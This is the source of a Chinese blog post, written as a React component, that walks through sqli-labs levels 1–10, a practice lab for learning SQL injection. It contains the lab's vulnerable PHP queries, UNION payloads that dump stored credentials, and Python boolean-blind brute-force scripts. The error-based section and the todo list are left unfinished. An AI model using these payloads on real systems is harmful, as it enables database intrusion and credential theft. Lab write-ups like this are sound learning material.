import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>参考资料</X.H1>
            <X.Uli>@[https://github.com/Audi-1/sqli-labs]@</X.Uli>
            <X.Uli>@详细sqli-labs（1-65）通关讲解[https://blog.csdn.net/dreamthe/article/details/123795302]@</X.Uli>
            <X.Uli>@MySQL注入天书[https://www.cnblogs.com/lcamry/category/846064.html]@</X.Uli>
            <X.H1>闭合：L1-L4</X.H1>
            <X.H2>前言 & 笔记</X.H2>
            <X.P>这几个Lab是基础的SQL查询闭合。这部分Lab没有明确的通关条件，因此就以爆库为目标。</X.P>
            <X.P>常用的一些信息收集语句：</X.P>
            <X.Uli>
                <X.P>查所有数据库：</X.P>
                <X.CodeBlock language="sql" code="SELECT group_concat(schema_name) FROM information_schema.schemata" />
            </X.Uli>
            <X.Uli>
                <X.P>查数据库`security`中的表：</X.P>
                <X.CodeBlock language="sql" code="SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'" />
            </X.Uli>
            <X.Uli>
                <X.P>查表`security.users`中的列：</X.P>
                <X.CodeBlock language="sql" code="SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='security' AND table_name='users'" />
            </X.Uli>
            <X.Uli>
                <X.P>查表`security.users`中的`username`和`password`数据：</X.P>
                <X.CodeBlock language="sql" code="SELECT group_concat(username),group_concat(password) FROM security.users" />
            </X.Uli>
            <X.H2>L1</X.H2>
            <X.CodeBlock
                language="php"
                code={String.raw`
                $id=$_GET['id'];
                $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
                $result=mysql_query($sql);
                `}
            />
            <X.CodeBlock language="python" code={`payload = "?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "`} />
            <X.H2>L2</X.H2>
            <X.CodeBlock
                language="php"
                code={String.raw`
                $id=$_GET['id'];
                $sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
                $result=mysql_query($sql);
                `}
            />
            <X.CodeBlock language="python" code={`payload = "?id=99 UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "`} />
            <X.H2>L3</X.H2>
            <X.CodeBlock
                language="php"
                code={String.raw`
                $id=$_GET['id'];
                $sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
                $result=mysql_query($sql);
                `}
            />
            <X.CodeBlock language="python" code={`payload = "?id=x') UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- "`} />
            <X.H2>L4</X.H2>
            <X.CodeBlock
                language="php"
                code={String.raw`
                $id=$_GET['id'];
                $id = '"' . $id . '"';
                $sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
                $result=mysql_query($sql);
                `}
            />
            <X.CodeBlock language="python" code={`payload = '?id=x") UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users -- '`} />
            <X.H1>盲注：L5-L10</X.H1>
            <X.H2>前言 & 笔记</X.H2>
            <X.P>有些场景下，服务端不会返回SQL查询结果，此时需要用到盲注技术。常见的盲注技术有基于布尔的盲注等、基于时间的盲注、基于报错的盲注。</X.P>
            <X.P>这一部分的Lab同样没有明确的通关条件，我们以查询`Angelina`用户的密码为目标：</X.P>
            <X.CodeBlock language="sql" code="SELECT password FROM security.users WHERE username='Angelina'" />
            <X.P>查询结果应为`I-kill-you`。</X.P>
            <X.H3>布尔盲注</X.H3>
            <X.P>如果查询成功/失败（有结果/无结果）时服务端的响应有差异（比如页面内容不同、响应长度不同），就可以利用这种差异进行布尔盲注。作者在创建这几个Lab时不修边幅，每个Lab的成功/失败查询的响应内容都有多多少少的差异，布尔盲注可以通杀。</X.P>
            <X.P>以下的MySQL函数在盲注中非常有用：</X.P>
            <X.Uli>
                <X.P>`substr(str, pos, len)`：从字符串`str`的第`pos`个字符开始，截取长度为`len`的子串。`pos`从1开始计数</X.P>
                <X.CodeBlock
                    language="sql"
                    code={String.raw`
                    SELECT substr("abcdef",1,3);          -- abc
                    SELECT substr((SELECT "123456"),4,3); -- 456
                    `}
                />
            </X.Uli>
            <X.Uli>
                <X.P>`ascii(ch)`：返回字符`ch`的ASCII码值，如果`ch`是字符串，则返回第一个字符的ASCII码值</X.P>
                <X.CodeBlock
                    language="sql"
                    code={String.raw`
                    SELECT ascii("A");   -- 65
                    SELECT ascii("abc"); -- 97
                    `}
                />
            </X.Uli>
            <X.H3>时间盲注</X.H3>
            <X.P>在页面回显内容完全没有差异的情况下，就需要用时间盲注。时间盲注利用下面的MySQL函数：</X.P>
            <X.Uli>
                <X.P>`sleep(sec)`：让数据库休眠指定的秒数</X.P>
                <X.CodeBlock language="sql" code="SELECT sleep(3);" />
            </X.Uli>
            <X.Uli>
                <X.P>`if(cond, exp_true, exp_false)`：如果条件`cond`为真，则返回`exp_true`，否则返回`exp_false`</X.P>
                <X.CodeBlock
                    language="sql"
                    code={String.raw`
                    SELECT if(1+1=2,"Yes","No"); -- Yes
                    SELECT if(11>45,sleep(1),4); -- 4
                    `}
                />
            </X.Uli>
            <X.H3>报错注入</X.H3>
            <X.P>如果服务端会将数据库报错信息返回给客户端，就可以利用报错信息进行注入，思路是让我们想要的查询结果作为报错信息的一部分返回。（此时盲注就不再是盲注了 ^v^）</X.P>
            <X.P>报错注入常用的MySQL函数有：</X.P>
            <X.H2>L5</X.H2>
            <X.P>以L5为例，思路是根据回显长度不同逐字符爆破出查询结果：</X.P>
            <X.CodeBlock
                language="python"
                highlightLines="5-6,11-14"
                code={String.raw`
                from query import *

                # target: SELECT password FROM security.users WHERE username='Angelina'

                print(len(query_get("Less-5", "?id=1' AND 1=0 -- ").text))  # 720
                print(len(query_get("Less-5", "?id=1' AND 1=1 -- ").text))  # 704


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- "
                        resp = query_get("Less-5", payload)
                        if len(resp.text) == 704:
                            return i
                    return None


                password = ""
                while True:
                    ch = brute_force(len(password) + 1)
                    if ch is None:
                        break
                    print("[*] found", chr(ch))
                    password += chr(ch)

                print(password)  # I-kill-you
                `}
            />
            <X.H2>L6</X.H2>
            <X.P>其他几个如法炮制，只需要变一下判断条件和闭合方式：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                print(len(query_get("Less-6", '?id=1" AND 1=0 -- ').text))  # 720
                print(len(query_get("Less-6", '?id=1" AND 1=1 -- ').text))  # 702


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),{pos},1))={i} -- '
                        resp = query_get("Less-6", payload)
                        if len(resp.text) == 702:
                            return i
                    return None
                `}
            />
            <X.H2>L7</X.H2>
            <X.P>L7刚好两种响应的长度是一样的，所以通过内容判断：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <font color= "#FFFF00">You have an error in your SQL syntax</font></font> </div></br></br></br><center>
                <font color= "#FFFF00">You are in.... Use outfile......<br></font></font> </div></br></br></br><center>
                `}
            />
            <X.CodeBlock
                language="python"
                code={String.raw`
                print("You are in" in query_get("Less-7", "?id=1')) AND 1=0 -- ").text)  # False
                print("You are in" in query_get("Less-7", "?id=1')) AND 1=1 -- ").text)  # True


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f"?id=1')) AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- "
                        resp = query_get("Less-7", payload)
                        if "You are in" in resp.text:
                            return i
                    return None
                `}
            />
            <X.H2>L8</X.H2>
            <X.CodeBlock
                language="python"
                code={String.raw`
                print(len(query_get("Less-8", "?id=1' AND 1=0 -- ").text))  # 722
                print(len(query_get("Less-8", "?id=1' AND 1=1 -- ").text))  # 706


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- "
                        resp = query_get("Less-8", payload)
                        if len(resp.text) == 706:
                            return i
                    return None
                `}
            />
            <X.H2>L9</X.H2>
            <X.CodeBlock
                language="python"
                code={String.raw`
                print(len(query_get("Less-9", "?id=1' AND 1=0 -- ").text))  # 744
                print(len(query_get("Less-9", "?id=1' AND 1=1 -- ").text))  # 707


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f"?id=1' AND ascii(substr((SELECT password FROM security.users WHERE username='Angelina'),{pos},1))={i} -- "
                        resp = query_get("Less-9", payload)
                        if len(resp.text) == 707:
                            return i
                    return None
                `}
            />
            <X.H2>L10</X.H2>
            <X.CodeBlock
                language="python"
                code={String.raw`
                print(len(query_get("Less-10", '?id=1" AND 1=0 -- ').text))  # 746
                print(len(query_get("Less-10", '?id=1" AND 1=1 -- ').text))  # 709


                def brute_force(pos):
                    for i in range(32, 127):
                        payload = f'?id=1" AND ascii(substr((SELECT password FROM security.users WHERE username="Angelina"),{pos},1))={i} -- '
                        resp = query_get("Less-10", payload)
                        if len(resp.text) == 709:
                            return i
                    return None
                `}
            />

            {/* 
            todo
            1.基于文件导入导出
            2.读写文件函数
            3.报错函数

L5有报错
L8没有报错
L9 L10 基于时间的盲注

            */}
        </>
    );
}
